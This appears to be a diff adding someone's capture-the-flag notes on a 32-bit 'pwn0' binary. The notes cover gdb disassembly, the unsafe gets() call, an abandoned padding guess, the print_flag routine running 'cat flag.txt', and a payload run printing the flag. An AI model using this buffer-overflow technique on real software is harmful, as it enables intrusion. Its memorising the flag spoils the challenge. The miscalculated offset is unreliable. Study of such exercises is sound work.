@@ -1,0 +1,96 @@
+How is the Josh?
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080484f1 <+0>:	push   %ebp
+   0x080484f2 <+1>:	mov    %esp,%ebp
+   0x080484f4 <+3>:	and    $0xfffffff0,%esp
+   0x080484f7 <+6>:	sub    $0x60,%esp
+   0x080484fa <+9>:	mov    0x80498a0,%eax
+   0x080484ff <+14>:	movl   $0x0,0xc(%esp)
+   0x08048507 <+22>:	movl   $0x2,0x8(%esp)
+   0x0804850f <+30>:	movl   $0x0,0x4(%esp)
+   0x08048517 <+38>:	mov    %eax,(%esp)
+   0x0804851a <+41>:	call   0x80483d0 <setvbuf@plt>
+   0x0804851f <+46>:	movl   $0x804861d,(%esp)
+   0x08048526 <+53>:	call   0x8048390 <puts@plt>           //How is the Josh?
+   0x0804852b <+58>:	lea    0x1c(%esp),%eax
+   0x0804852f <+62>:	mov    %eax,(%esp)
+   0x08048532 <+65>:	call   0x8048370 <gets@plt>         //and Here It asks me to answer at the question (UserInput)
+   0x08048537 <+70>:	movl   $0x4,0x8(%esp)
+   0x0804853f <+78>:	movl   $0x804862d,0x4(%esp)
+   0x08048547 <+86>:	lea    0x5c(%esp),%eax
+   0x0804854b <+90>:	mov    %eax,(%esp)
+   0x0804854e <+93>:	call   0x8048380 <memcmp@plt>
+   0x08048553 <+98>:	test   %eax,%eax
+   0x08048555 <+100>:	jne    0x804856a <main+121>
+   0x08048557 <+102>:	movl   $0x8048632,(%esp)
+   0x0804855e <+109>:	call   0x8048390 <puts@plt>
+   0x08048563 <+114>:	call   0x80484dd <print_flag>          //here I noticed that there's a call to printflag, our obb
+--Type <RET> for more, q to quit, c to continue without paging--c
+   0x08048568 <+119>:	jmp    0x8048576 <main+133>
+   0x0804856a <+121>:	movl   $0x8048648,(%esp)
+   0x08048571 <+128>:	call   0x8048390 <puts@plt>
+   0x08048576 <+133>:	mov    $0x0,%eax
+   0x0804857b <+138>:	leave
+   0x0804857c <+139>:	ret
+End of assembler dump.
+
+
+I try with an Buffer Overflow
+
+   0x08048532 <+65>:	call   0x8048370 <gets@plt>         //and Here It asks me to answer at the question (UserInput)
+   0x08048537 <+70>:	movl   $0x4,0x8(%esp)
+   0x0804853f <+78>:	movl   $0x804862d,0x4(%esp)
+   0x08048547 <+86>:	lea    0x5c(%esp),%eax
+   0x0804854b <+90>:	mov    %eax,(%esp)
+   0x0804854e <+93>:	call   0x8048380 <memcmp@plt>
+   0x08048553 <+98>:	test   %eax,%eax
+   0x08048555 <+100>:	jne    0x804856a <main+121>       //I need to overwrite this jump
+   
+   
+   |65-100| = 35
+   
+   012345678901234567890123456789012345678 == 35 chr long
+   
+   Do not work
+   
+   
+   ---------------------------------------------------------------------
+   
+   
+   S:
+   
+   
+   public print_flag
+print_flag proc near
+; __unwind {
+push    ebp
+mov     ebp, esp
+sub     esp, 18h
+mov     dword ptr [esp], offset aCatFlagTxt ; "cat flag.txt"
+call    _system
+leave
+retn
+; } // starts at 80484DD
+print_flag endp
+
+
+
+
+mov     dword ptr [esp], offset aCatFlagTxt ; "cat flag.txt"
+call    _system
+leave
+
+
+
+python3 payload.py 
+[+] Starting local process './pwn0': pid 10189
+/home/tuba/Desktop/CTFS/Challenges15/Challenges/2_enc_pwn0/payload.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(msgIN)
+[+] Receiving all data: Done (70B)
+[*] Process './pwn0' stopped with exit code 0 (pid 10189)
+Output:     b"How's the josh?\nGood! here's the flag\nencryptCTF{L3t5_R4!53_7h3_J05H}\n"
+
+
+
